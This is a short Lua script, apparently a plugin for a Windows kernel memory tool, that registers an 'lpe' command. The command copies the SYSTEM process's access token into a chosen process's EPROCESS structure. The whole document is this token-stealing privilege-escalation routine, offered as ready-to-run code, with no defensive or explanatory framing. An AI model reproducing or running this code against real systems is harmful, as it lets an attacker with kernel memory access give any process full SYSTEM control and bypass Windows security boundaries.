-- Local privilege escalation: copy the SYSTEM process token onto a target
-- process's EPROCESS, granting it SYSTEM privileges

register_command("lpe", "Copy the SYSTEM process token onto a target process.\n(usage: lpe <pid|name>)", {"process"}, function(target)
    if not target then
        ntos.command_usage()
        return
    end

    local p = ntos.process(target)

    -- PsInitialSystemProcess is a PEPROCESS*: the symbol points at the global
    -- pointer, so deref once to get the System EPROCESS
    local system = ntos.read_qword(ntos.eval("PsInitialSystemProcess"))
    local token_off = ntos.offset_of("_EPROCESS", "Token")
    local token = ntos.read_qword(system + token_off)

    ntos.write_qword(p.eprocess + token_off, token)
    print(("escalated %s (pid %d) -> SYSTEM token %s"):format(
        p.name, p.pid, tostring(token)))
end)
